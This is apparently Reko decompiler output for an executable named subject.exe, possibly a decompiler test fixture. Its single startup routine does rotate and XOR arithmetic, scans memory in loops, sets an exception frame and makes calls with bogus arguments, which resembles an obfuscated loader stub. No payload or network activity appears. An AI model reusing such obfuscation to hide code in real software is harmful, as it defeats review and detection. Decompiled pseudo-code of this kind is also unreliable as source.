// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 0040110B: Register DWORD Win32CrtStartup()
DWORD Win32CrtStartup()
{
Win32CrtStartup_entry:
	def fp
	def ebx
	def edi
	def ebp
	def ecx
	def Mem0
	def dwArg00
	def fs
	__rol(ecx, 0x1B)
	GetCommandLineA()
	eax_23 = DPB(Mem0[ebx + 0x1C:word32], 0x00, 0) (alias)
	esi_27 = Mem0[0x00401104:word32]
	edi_29 = edi + ebp & 0x004010C6
	goto l00401167
l0040110B:
l00401138:
l00401167:
	edi_34 = PHI(edi_29, edi_46)
	eax_35 = PHI(eax_23, eax_37)
	edi_40 = __ror(edi_34, 0x06)
	eax_37 = eax_35 + 0x01
	edi_46 = DPB(edi_40, (word16) edi_40 + 0x49, 0) (alias)
	edx_47 = ~Mem0[eax_37 + 0x00:word32] + esi_27
	branch edx_47 != 0x01 l00401167
l00401189:
	edx_62 = DPB(edx_47 + 0x01, Mem0[eax_37 - 0x08 + 0x00:word16], 0) (alias)
	__ror((word16) __ror(esi_27 * 0x02, 0x02), 0x01)
	ecx_73 = dwArg00
	edi_78 = Mem0[0x0040104E:word32]
	eax_80 = 0x0040102F
	ax_81 = 4143 (alias)
l004011BD:
	ax_83 = PHI(ax_81, ax_94)
	ecx_84 = PHI(ecx_73, ecx_90)
	eax_85 = PHI(eax_80, eax_95)
	esi_88 = Mem0[ecx_84 + 0x00:word32]
	ecx_90 = ecx_84 - ~0x00
	ax_94 = __ror(ax_83, 0x0E)
	cx_91 = (word16) ecx_90 (alias)
	eax_95 = DPB(eax_85, ax_94, 0) (alias)
	branch (esi_88 ^ edi_78) == 0x00 l004011DE
	goto l004011BD
l004011DE:
	__rol(cx_91, 0x09)
	__ror((edi_78 ^ ~0x14F11180) >> 0x07, 0x0C)
	edx_118 = edx_62 << 0x10 >>u 0x10
	edx_128 = DPB(edx_118, __rol((word16) edx_118, 0x0D), 0) (alias)
	Mem141[fs:0x00:word32] = fp - 0x08
	__rol((word16) (fp - 0x08), 0x0D)
	eax_140 = eax_95 - 1801121015 ^ edx_128
	Mem159[0x07B0:word32] = Mem141[0x07B0:word32] ^ eax_140 - 0x01
	__rol(RegEnumKeyW(0x07B0, ~0x4A5B4D8A, eax_140 - 0x01, 0x00), 0x09)
	GetDC(0x07B0)
	__rol((edx_128 << 0x02) + 0x07B0, 22)
l0040126B:
Win32CrtStartup_exit:
}

